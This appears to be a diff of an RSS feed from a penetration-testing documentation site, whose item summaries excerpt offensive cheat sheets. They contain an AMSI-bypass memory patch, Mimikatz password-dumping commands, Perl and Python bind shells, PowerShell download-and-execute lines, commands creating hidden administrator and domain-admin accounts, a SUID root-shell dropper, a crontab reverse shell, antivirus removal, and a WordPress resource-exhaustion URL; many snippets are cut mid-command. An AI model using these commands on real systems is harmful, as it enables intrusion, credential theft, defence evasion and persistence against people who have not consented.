-/wp-admin/load-scripts.php?load=eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter Check IP behind Cloudflare # https://blog.nem.ec/2020/01/22/discover-cloudflare-wordpress-ip/ Get the IP address of a target wordpress website by abusing the ping-back feature</description></item><item><title>Windows - Hardening</title><link>https://www.grayhatfreelancing.com/docs/windows_hardening/</link><pubDate>Mon, 07 Nov 2022 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/windows_hardening/</guid><description>Windows - Hardening # Essential Concepts to Understand # Windows Services # Windows Services create and manage critical functions such as network connectivity, storage, memory, sound, user credentials, and data backup and runs automatically in the background. These services are managed by the Service Control Manager panel and divided into three categories, i.e. Local, Network &amp;amp; System. Many applications like browsers and anti-virus software can also run their services for a seamless user experience.</description></item><item><title>Bypassing AMSI protections</title><link>https://www.grayhatfreelancing.com/docs/windows_amsi_bypass/</link><pubDate>Fri, 04 Nov 2022 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/windows_amsi_bypass/</guid><description>AMSI Bypass # Which Endpoint Protection is Using AMSI # https://github.com/subat0mik/whoamsi/wiki/Which-Endpoint-Protection-is-Using-AMSI%3F Patching amsi.dll AmsiScanBuffer by rasta-mouse # $Win32 = @&amp;#34; using System; using System.Runtime.InteropServices; public class Win32 { [DllImport(&amp;#34;kernel32&amp;#34;)] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName); [DllImport(&amp;#34;kernel32&amp;#34;)] public static extern IntPtr LoadLibrary(string name); [DllImport(&amp;#34;kernel32&amp;#34;)] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect); } &amp;#34;@ Add-Type $Win32 $LoadLibrary = [Win32]::LoadLibrary(&amp;#34;am&amp;#34; + &amp;#34;si.dll&amp;#34;) $Address = [Win32]::GetProcAddress($LoadLibrary, &amp;#34;Amsi&amp;#34; + &amp;#34;Scan&amp;#34; + &amp;#34;Buffer&amp;#34;) $p = 0 [Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p) $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3) [System.</description></item><item><title>Enumerating Subdomains</title><link>https://www.grayhatfreelancing.com/docs/subdomains_enumeration/</link><pubDate>Fri, 04 Nov 2022 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/subdomains_enumeration/</guid><description>Subdomains Enumeration # Enumerate all subdomains (only if the scope is *.domain.ext) # Using Subbrute # git clone https://github.com/TheRook/subbrute python subbrute.py domain.example.com Using KnockPy with Daniel Miessler’s SecLists for subdomain &amp;ldquo;/Discover/DNS&amp;rdquo; # git clone https://github.com/guelfoweb/knock git clone https://github.com/danielmiessler/SecLists.git knockpy domain.com -w subdomains-top1mil-110000.txt Using EyeWitness and Nmap scans from the KnockPy and enumall scans
-git clone https://github.com/ChrisTruncer/EyeWitness.git ./setup/setup.sh ./EyeWitness.py -f filename -t optionaltimeout --open (Optional) ./EyeWitness -f urls.txt --web ./EyeWitness -x urls.</description></item><item><title>Windows - Mimikatz</title><link>https://www.grayhatfreelancing.com/docs/windows_mimikatz/</link><pubDate>Fri, 04 Nov 2022 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/windows_mimikatz/</guid><description>Windows - Mimikatz # Mimikatz - Execute commands # Only one command
+Crunch # crunch 4 6 0123456789ABCDEF -o crunch1.txt #From length 4 to 6 using that alphabet crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using charset mixalpha (inside file charset.lst) @ Lower case alpha characters , Upper case alpha characters % Numeric characters ^ Special characters including spac crunch 6 8 -t ,@@^^%% Cewl # cewl example.</description>
+    </item>
+    
+    <item>
+      <title>Training Grounds</title>
+      <link>https://www.grayhatfreelancing.com/docs/training_grounds/</link>
+      <pubDate>Sun, 15 Jan 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/training_grounds/</guid>
+      <description>Training Grounds # Online Websites and Communities # HackTheBox.EU &amp;amp; HTB Catalogue Hackthebox has online machines to hack, it&amp;rsquo;s a pretty solid training ground, I personally lean towards TryHackMe. But, you should practie everywhere and often. Try learning by doing retired machines following Ippsec videos. HackTheBox Academy is connected to HackerOne.
+TryHackMe Tryhackme is another formidable learning platform. Some rooms are simply walkthroughs where you can read, learn and basically just type what they tell you, other rooms require some self-study to complete and there&amp;rsquo;s also challenge rooms, CTFs and King of the Hill competition mode!</description>
+    </item>
+    
+    <item>
+      <title>Wordpress Security</title>
+      <link>https://www.grayhatfreelancing.com/docs/wordpress/</link>
+      <pubDate>Sun, 20 Nov 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/wordpress/</guid>
+      <description>WordPress Security # Wordpress Tools: # https://github.com/wpscanteam/wpscan - One of the better tools at it&amp;rsquo;s just. &amp;ndash; gem install wpscan &amp;ndash; docker pull wpscanteam/wpscan &amp;ndash; wpscan &amp;ndash;update # updates the database &amp;ndash; Users of pentesting distrobutions generally should install the version from their repository. https://github.com/nullfil3/xmlrpc-scan https://github.com/relarizky/wpxploit Wordpress Tricks: # load-scripts.php denial of service # load-scripts.php resource exhaustion Wordpress versions 4.9.3 and prior:
+/wp-admin/load-scripts.php?load=eutil,common,wp-a11y,sack,quicktag,colorpicker,editor,wp-fullscreen-stu,wp-ajax-response,wp-api-request,wp-pointer,autosave,heartbeat,wp-auth-check,wp-lists,prototype,scriptaculous-root,scriptaculous-builder,scriptaculous-dragdrop,scriptaculous-effects,scriptaculous-slider,scriptaculous-sound,scriptaculous-controls,scriptaculous,cropper,jquery,jquery-core,jquery-migrate,jquery-ui-core,jquery-effects-core,jquery-effects-blind,jquery-effects-bounce,jquery-effects-clip,jquery-effects-drop,jquery-effects-explode,jquery-effects-fade,jquery-effects-fold,jquery-effects-highlight,jquery-effects-puff,jquery-effects-pulsate,jquery-effects-scale,jquery-effects-shake,jquery-effects-size,jquery-effects-slide,jquery-effects-transfer,jquery-ui-accordion,jquery-ui-autocomplete,jquery-ui-button,jquery-ui-datepicker,jquery-ui-dialog,jquery-ui-draggable,jquery-ui-droppable,jquery-ui-menu,jquery-ui-mouse,jquery-ui-position,jquery-ui-progressbar,jquery-ui-resizable,jquery-ui-selectable,jquery-ui-selectmenu,jquery-ui-slider,jquery-ui-sortable,jquery-ui-spinner,jquery-ui-tabs,jquery-ui-tooltip,jquery-ui-widget,jquery-form,jquery-color,schedule,jquery-query,jquery-serialize-object,jquery-hotkeys,jquery-table-hotkeys,jquery-touch-punch,suggest,imagesloaded,masonry,jquery-masonry,thickbox,jcrop,swfobject,moxiejs,plupload,plupload-handlers,wp-plupload,swfupload,swfupload-all,swfupload-handlers,comment-repl,json2,underscore,backbone,wp-util,wp-sanitize,wp-backbone,revisions,imgareaselect,mediaelement,mediaelement-core,mediaelement-migrat,mediaelement-vimeo,wp-mediaelement,wp-codemirror,csslint,jshint,esprima,jsonlint,htmlhint,htmlhint-kses,code-editor,wp-theme-plugin-editor,wp-playlist,zxcvbn-async,password-strength-meter,user-profile,language-chooser,user-suggest,admin-ba,wplink,wpdialogs,word-coun,media-upload,hoverIntent,customize-base,customize-loader,customize-preview,customize-models,customize-views,customize-controls,customize-selective-refresh,customize-widgets,customize-preview-widgets,customize-nav-menus,customize-preview-nav-menus,wp-custom-header,accordion,shortcode,media-models,wp-embe,media-views,media-editor,media-audiovideo,mce-view,wp-api,admin-tags,admin-comments,xfn,postbox,tags-box,tags-suggest,post,editor-expand,link,comment,admin-gallery,admin-widgets,media-widgets,media-audio-widget,media-image-widget,media-gallery-widget,media-video-widget,text-widgets,custom-html-widgets,theme,inline-edit-post,inline-edit-tax,plugin-install,updates,farbtastic,iris,wp-color-picker,dashboard,list-revision,media-grid,media,image-edit,set-post-thumbnail,nav-menu,custom-header,custom-background,media-gallery,svg-painter Check IP behind Cloudflare # https://blog.nem.ec/2020/01/22/discover-cloudflare-wordpress-ip/ Get the IP address of a target wordpress website by abusing the ping-back feature</description>
+    </item>
+    
+    <item>
+      <title>Windows - Hardening</title>
+      <link>https://www.grayhatfreelancing.com/docs/windows_hardening/</link>
+      <pubDate>Mon, 07 Nov 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/windows_hardening/</guid>
+      <description>Windows - Hardening # Essential Concepts to Understand # Windows Services # Windows Services create and manage critical functions such as network connectivity, storage, memory, sound, user credentials, and data backup and runs automatically in the background. These services are managed by the Service Control Manager panel and divided into three categories, i.e. Local, Network &amp;amp; System. Many applications like browsers and anti-virus software can also run their services for a seamless user experience.</description>
+    </item>
+    
+    <item>
+      <title>Bypassing AMSI protections</title>
+      <link>https://www.grayhatfreelancing.com/docs/windows_amsi_bypass/</link>
+      <pubDate>Fri, 04 Nov 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/windows_amsi_bypass/</guid>
+      <description>AMSI Bypass # Which Endpoint Protection is Using AMSI # https://github.com/subat0mik/whoamsi/wiki/Which-Endpoint-Protection-is-Using-AMSI%3F Patching amsi.dll AmsiScanBuffer by rasta-mouse # $Win32 = @&amp;#34; using System; using System.Runtime.InteropServices; public class Win32 { [DllImport(&amp;#34;kernel32&amp;#34;)] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName); [DllImport(&amp;#34;kernel32&amp;#34;)] public static extern IntPtr LoadLibrary(string name); [DllImport(&amp;#34;kernel32&amp;#34;)] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect); } &amp;#34;@ Add-Type $Win32 $LoadLibrary = [Win32]::LoadLibrary(&amp;#34;am&amp;#34; + &amp;#34;si.dll&amp;#34;) $Address = [Win32]::GetProcAddress($LoadLibrary, &amp;#34;Amsi&amp;#34; + &amp;#34;Scan&amp;#34; + &amp;#34;Buffer&amp;#34;) $p = 0 [Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p) $Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3) [System.</description>
+    </item>
+    
+    <item>
+      <title>Enumerating Subdomains</title>
+      <link>https://www.grayhatfreelancing.com/docs/subdomains_enumeration/</link>
+      <pubDate>Fri, 04 Nov 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/subdomains_enumeration/</guid>
+      <description>Subdomains Enumeration # Enumerate all subdomains (only if the scope is *.domain.ext) # Using Subbrute # git clone https://github.com/TheRook/subbrute python subbrute.py domain.example.com Using KnockPy with Daniel Miessler’s SecLists for subdomain &amp;ldquo;/Discover/DNS&amp;rdquo; # git clone https://github.com/guelfoweb/knock git clone https://github.com/danielmiessler/SecLists.git knockpy domain.com -w subdomains-top1mil-110000.txt Using EyeWitness and Nmap scans from the KnockPy and enumall scans
+git clone https://github.com/ChrisTruncer/EyeWitness.git ./setup/setup.sh ./EyeWitness.py -f filename -t optionaltimeout --open (Optional) ./EyeWitness -f urls.txt --web ./EyeWitness -x urls.</description>
+    </item>
+    
+    <item>
+      <title>Windows - Mimikatz</title>
+      <link>https://www.grayhatfreelancing.com/docs/windows_mimikatz/</link>
+      <pubDate>Fri, 04 Nov 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/windows_mimikatz/</guid>
+      <description>Windows - Mimikatz # Mimikatz - Execute commands # Only one command
 PS C:\temp\mimikatz&amp;gt; .\mimikatz &amp;#34;privilege::debug&amp;#34; &amp;#34;sekurlsa::logonpasswords&amp;#34; exit Mimikatz console (multiple commands)
-PS C:\temp\mimikatz&amp;gt; .\mimikatz mimikatz # privilege::debug mimikatz # log mimikatz # sekurlsa::logonpasswords mimikatz # sekurlsa::wdigest Mimikatz - Extract passwords # Microsoft disabled lsass clear text storage since Win8.1 / 2012R2+. It was backported (KB2871997) as a reg key on Win7 / 8 / 2008R2 / 2012 but clear text is still enabled.</description></item><item><title>Windows - Persistence</title><link>https://www.grayhatfreelancing.com/docs/windows_persistence/</link><pubDate>Fri, 04 Nov 2022 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/windows_persistence/</guid><description>Windows - Persistence # Tools # SharPersist - Windows persistence toolkit written in C#. - @h4wkst3r Hide Your Binary # Sets (+) or clears (-) the Hidden file attribute. If a file uses this attribute set, you must clear the attribute before you can change any other attributes for the file.
-PS&amp;gt; attrib +h mimikatz.exe Disable Antivirus and Security # Antivirus Removal # Sophos Removal Tool.ps1 Symantec CleanWipe Elastic EDR/Security cd &amp;#34;C:\Program Files\Elastic\Agent\&amp;#34; PS C:\Program Files\Elastic\Agent&amp;gt; .</description></item><item><title>Windows - Privilege Escalation</title><link>https://www.grayhatfreelancing.com/docs/windows_privilege_escalation/</link><pubDate>Fri, 04 Nov 2022 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/windows_privilege_escalation/</guid><description>Windows - Privilege Escalation # Tools # PowerSploit&amp;rsquo;s PowerUp powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString(&amp;#39;https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1&amp;#39;); Invoke-AllChecks Watson - Watson is a (.NET 2.0 compliant) C# implementation of Sherlock (Deprecated) Sherlock - PowerShell script to quickly find missing software patches for local privilege escalation vulnerabilities powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File Sherlock.ps1 BeRoot - Privilege Escalation Project - Windows / Linux / Mac Windows-Exploit-Suggester ./windows-exploit-suggester.py --update .</description></item><item><title>Windows - Using Credentials</title><link>https://www.grayhatfreelancing.com/docs/windows_using_credentials/</link><pubDate>Fri, 04 Nov 2022 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/windows_using_credentials/</guid><description>Windows - Using credentials # TIPS # TIP 1 - Create your credential # net user hacker Hcker_12345678* /add /Y net localgroup administrators hacker /add net localgroup &amp;#34;Remote Desktop Users&amp;#34; hacker /add # RDP access net localgroup &amp;#34;Backup Operators&amp;#34; hacker /add # Full access to files net group &amp;#34;Domain Admins&amp;#34; hacker /add /domain # enable a domain user account net user hacker /ACTIVE:YES /domain # prevent users from changing their password net user username /Passwordchg:No # prevent the password to expire net user hacker /Expires:Never # create a machine account (not shown in net users) net user /add evilbob$ evilpassword # homoglyph Aԁmіnistratοr (different of Administrator) Aԁmіnistratοr Some info about your user</description></item><item><title>Windows Download and Execute Methods</title><link>https://www.grayhatfreelancing.com/docs/windows_download_and_execute/</link><pubDate>Fri, 04 Nov 2022 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/windows_download_and_execute/</guid><description>Windows - Download and execute methods # Downloaded files location # C:\Users&amp;lt;username&amp;gt;\AppData\Local\Microsoft\Windows\Temporary Internet Files\ C:\Users&amp;lt;username&amp;gt;\AppData\Local\Microsoft\Windows\INetCache\IE&amp;lt;subdir&amp;gt; C:\Windows\ServiceProfiles\LocalService\AppData\Local\Temp\TfsStore\Tfs_DAV Powershell # From an HTTP server
-powershell -exec bypass -c &amp;#34;(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr(&amp;#39;http://webserver/payload.ps1&amp;#39;)|iex&amp;#34; # Download only (New-Object System.Net.WebClient).DownloadFile(&amp;#34;http://10.10.10.10/PowerUp.ps1&amp;#34;, &amp;#34;C:\Windows\Temp\PowerUp.ps1&amp;#34;) Invoke-WebRequest &amp;#34;http://10.10.10.10/binary.exe&amp;#34; -OutFile &amp;#34;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\binary.exe&amp;#34; # Download and run Rubeus, with arguments $data = (New-Object System.Net.WebClient).DownloadData(&amp;#39;http://10.10.10.10/Rubeus.exe&amp;#39;) $assem = [System.Reflection.Assembly]::Load($data) [Rubeus.Program]::Main(&amp;#34;s4u /user:web01$ /rc4:1d77f43d9604e79e5626c6905705801e /impersonateuser:administrator /msdsspn:cifs/file01 /ptt&amp;#34;.Split()) # Execute a specific method from an assembly $data = (New-Object System.</description></item><item><title>Application Escape and Breakout</title><link>https://www.grayhatfreelancing.com/docs/escape_breakout/</link><pubDate>Thu, 03 Nov 2022 04:33:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/escape_breakout/</guid><description>Application Escape and Breakout # Gaining a command shell # Shortcut [Window] + [R] -&amp;gt; cmd [CTRL] + [SHIFT] + [ESC] -&amp;gt; Task Manager [CTRL] + [ALT] + [DELETE] -&amp;gt; Task Manager Access through file browser: Browsing to the folder containing the binary (i.e. C:\windows\system32\), we can simply right click and open it Drag-and-drop: dragging and dropping any file onto the cmd.exe Hyperlink: file:///c:/Windows/System32/cmd.exe Task Manager: File &amp;gt; New Task (Run.</description></item><item><title>Attacking Office</title><link>https://www.grayhatfreelancing.com/docs/office_attacks/</link><pubDate>Thu, 03 Nov 2022 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/office_attacks/</guid><description>Office - Attacks # XLSM - Hot Manchego # When using EPPlus, the creation of the Excel document varied significantly enough that most A/V didn&amp;rsquo;t catch a simple lolbas payload to get a beacon on a target machine.
-https://github.com/FortyNorthSecurity/hot-manchego Generate CS Macro and save it to Windows as vba.txt PS&amp;gt; New-Item blank.xlsm PS&amp;gt; C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /reference:EPPlus.dll hot-manchego.cs PS&amp;gt; .\hot-manchego.exe .\blank.xlsm .\vba.txt XLM - Macrome # XOR Obfuscation technique will NOT work with VBA macros since VBA is stored in a different stream that will not be encrypted when you password protect the document.</description></item><item><title>Bind Shell Cheatsheet</title><link>https://www.grayhatfreelancing.com/docs/bind_shell_cheatsheet/</link><pubDate>Thu, 03 Nov 2022 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/bind_shell_cheatsheet/</guid><description>Bind Shell # Perl # perl -e &amp;#39;use Socket;$p=51337;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&amp;#34;tcp&amp;#34;));\ bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);\ close C){open(STDIN,&amp;#34;&amp;gt;&amp;amp;C&amp;#34;);open(STDOUT,&amp;#34;&amp;gt;&amp;amp;C&amp;#34;);open(STDERR,&amp;#34;&amp;gt;&amp;amp;C&amp;#34;);exec(&amp;#34;/bin/bash -i&amp;#34;);};&amp;#39; Python # Single line :
-python -c &amp;#39;exec(&amp;#34;&amp;#34;&amp;#34;import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((&amp;#34;0.0.0.0&amp;#34;,51337));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())&amp;#34;&amp;#34;&amp;#34;)&amp;#39; Expanded version :
-import socket as s,subprocess as sp; s1 = s.socket(s.AF_INET, s.SOCK_STREAM); s1.setsockopt(s.SOL_SOCKET, s.SO_REUSEADDR, 1); s1.bind((&amp;#34;0.0.0.0&amp;#34;, 51337)); s1.listen(1); c, a = s1.accept(); while True: d = c.recv(1024).decode(); p = sp.Popen(d, shell=True, stdout=sp.PIPE, stderr=sp.PIPE, stdin=sp.PIPE); c.sendall(p.stdout.read()+p.stderr.read()) PHP # php -r &amp;#39;$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,&amp;#34;0.</description></item><item><title>Bug Hunting Methodology and Enumeration</title><link>https://www.grayhatfreelancing.com/docs/methodology_and_enumeration/</link><pubDate>Thu, 03 Nov 2022 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/methodology_and_enumeration/</guid><description>Bug Hunting Methodology and Enumeration # Passive recon # Using Shodan (https://www.shodan.io/) to detect similar app
-can be integrated with nmap (https://github.com/glennzw/shodan-hq-nse) nmap --script shodan-hq.nse --script-args &amp;#39;apikey=&amp;lt;yourShodanAPIKey&amp;gt;,target=&amp;lt;hackme&amp;gt;&amp;#39; Using The Wayback Machine (https://archive.org/web/) to detect forgotten endpoints
-look for JS files, old links curl -sX GET &amp;#34;http://web.archive.org/cdx/search/cdx?url=&amp;lt;targetDomain.com&amp;gt;&amp;amp;output=text&amp;amp;fl=original&amp;amp;collapse=urlkey&amp;amp;matchType=prefix&amp;#34; Using The Harvester
-python theHarvester.py -b all -d domain.com Active recon # Network discovery with masscan, nmap etc.
-rpcclient
-$ rpcclient -U &amp;#39;%&amp;#39; [target host] rpcclient $&amp;gt; querydominfo Domain: WORKGROUP Server: METASPLOITABLE Comment: metasploitable server (Samba 3.</description></item><item><title>Hash Cracking Cheatsheet</title><link>https://www.grayhatfreelancing.com/docs/hash_cracking/</link><pubDate>Thu, 03 Nov 2022 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/hash_cracking/</guid><description>Hash Cracking # Hashcat # Hashcat Install # apt install cmake build-essential -y apt install checkinstall git -y git clone https://github.com/hashcat/hashcat.git &amp;amp;&amp;amp; cd hashcat &amp;amp;&amp;amp; make -j 8 &amp;amp;&amp;amp; make install Extract the hash Get the hash format: https://hashcat.net/wiki/doku.php?id=example_hashes Establish a cracking stratgy based on hash format (ex: wordlist -&amp;gt; wordlist + rules -&amp;gt; mask -&amp;gt; combinator mode -&amp;gt; prince attack -&amp;gt; &amp;hellip;) Enjoy plains Review strategy Start over Dictionary # Every word of a given list (a.</description></item><item><title>Linux - Persistence</title><link>https://www.grayhatfreelancing.com/docs/linux_persistence/</link><pubDate>Thu, 03 Nov 2022 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/linux_persistence/</guid><description>Linux - Persistence # Basic reverse shell # ncat --udp -lvp 4242 ncat --sctp -lvp 4242 ncat --tcp -lvp 4242 Add a root user # sudo useradd -ou 0 -g 0 john sudo passwd john echo &amp;#34;linuxpassword&amp;#34; | passwd --stdin john Suid Binary # TMPDIR2=&amp;#34;/var/tmp&amp;#34; echo &amp;#39;int main(void){setresuid(0, 0, 0);system(&amp;#34;/bin/sh&amp;#34;);}&amp;#39; &amp;gt; $TMPDIR2/croissant.c gcc $TMPDIR2/croissant.c -o $TMPDIR2/croissant 2&amp;gt;/dev/null rm $TMPDIR2/croissant.c chown root:root $TMPDIR2/croissant chmod 4777 $TMPDIR2/croissant Crontab - Reverse shell # (crontab -l ; echo &amp;#34;@reboot sleep 200 &amp;amp;&amp;amp; ncat 192.</description></item><item><title>Linux - Privilege Escalation</title><link>https://www.grayhatfreelancing.com/docs/linux_privilege_escalation/</link><pubDate>Thu, 03 Nov 2022 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/linux_privilege_escalation/</guid><description>Linux - Privilege Escalation # Tools # There are many scripts that you can execute on a linux machine which automatically enumerate sytem information, processes, and files to locate privilege escelation vectors. Here are a few:
-LinPEAS - Linux Privilege Escalation Awesome Script
-wget &amp;#34;https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh&amp;#34; -O linpeas.sh curl &amp;#34;https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh&amp;#34; -o linpeas.sh ./linpeas.sh -a #all checks - deeper system enumeration, but it takes longer to complete. ./linpeas.sh -s #superfast &amp;amp; stealth - This will bypass some time consuming checks.</description></item><item><title>Metasploit</title><link>https://www.grayhatfreelancing.com/docs/metasploit_cheatsheet/</link><pubDate>Thu, 03 Nov 2022 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/metasploit_cheatsheet/</guid><description>Metasploit # Installation # curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &amp;gt; msfinstall &amp;amp;&amp;amp; chmod 755 msfinstall &amp;amp;&amp;amp; ./msfinstall or docker
-sudo docker run --rm -it -p 443:443 -v ~/.msf4:/root/.msf4 -v /tmp/msf:/tmp/data remnux/metasploit Sessions # CTRL+Z -&amp;gt; Session in Background sessions -&amp;gt; List sessions sessions -i session_number -&amp;gt; Interact with Session with id sessions -u session_number -&amp;gt; Upgrade session to a meterpreter sessions -u session_number LPORT=4444 PAYLOAD_OVERRIDE=meterpreter/reverse_tcp HANDLER=false-&amp;gt; Upgrade session to a meterpreter sessions -c cmd -&amp;gt; Execute a command on several sessions sessions -i 10-20 -c &amp;#34;id&amp;#34; -&amp;gt; Execute a command on several sessions Background handler # ExitOnSession : the handler will not exit if the meterpreter dies.</description></item><item><title>Microsoft Window's Data Protection API</title><link>https://www.grayhatfreelancing.com/docs/windows_dpapi/</link><pubDate>Thu, 03 Nov 2022 00:00:00 +0000</pubDate><guid>https://www.grayhatfreelancing.com/docs/windows_dpapi/</guid><description>Windows - DPAPI # On Windows, credentials saved in the Windows Credentials Manager are encrypted using Microsoft&amp;rsquo;s Data Protection API and stored as &amp;ldquo;blob&amp;rdquo; files in user AppData folder.
-Summary # Data Protection API List Credential Files Mimikatz - Credential Manager &amp;amp; DPAPI Hekatomb - Steal all credentials on domain DonPAPI - Dumping DPAPI credz remotely Data Protection API # Outside of a domain: the user&amp;rsquo;s password hash is used to encrypt these &amp;ldquo;blobs&amp;rdquo;.</description></item></channel></rss>
+PS C:\temp\mimikatz&amp;gt; .\mimikatz mimikatz # privilege::debug mimikatz # log mimikatz # sekurlsa::logonpasswords mimikatz # sekurlsa::wdigest Mimikatz - Extract passwords # Microsoft disabled lsass clear text storage since Win8.1 / 2012R2+. It was backported (KB2871997) as a reg key on Win7 / 8 / 2008R2 / 2012 but clear text is still enabled.</description>
+    </item>
+    
+    <item>
+      <title>Windows - Persistence</title>
+      <link>https://www.grayhatfreelancing.com/docs/windows_persistence/</link>
+      <pubDate>Fri, 04 Nov 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/windows_persistence/</guid>
+      <description>Windows - Persistence # Tools # SharPersist - Windows persistence toolkit written in C#. - @h4wkst3r Hide Your Binary # Sets (+) or clears (-) the Hidden file attribute. If a file uses this attribute set, you must clear the attribute before you can change any other attributes for the file.
+PS&amp;gt; attrib +h mimikatz.exe Disable Antivirus and Security # Antivirus Removal # Sophos Removal Tool.ps1 Symantec CleanWipe Elastic EDR/Security cd &amp;#34;C:\Program Files\Elastic\Agent\&amp;#34; PS C:\Program Files\Elastic\Agent&amp;gt; .</description>
+    </item>
+    
+    <item>
+      <title>Windows - Privilege Escalation</title>
+      <link>https://www.grayhatfreelancing.com/docs/windows_privilege_escalation/</link>
+      <pubDate>Fri, 04 Nov 2022 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.grayhatfreelancing.com/docs/windows_privilege_escalation/</guid>
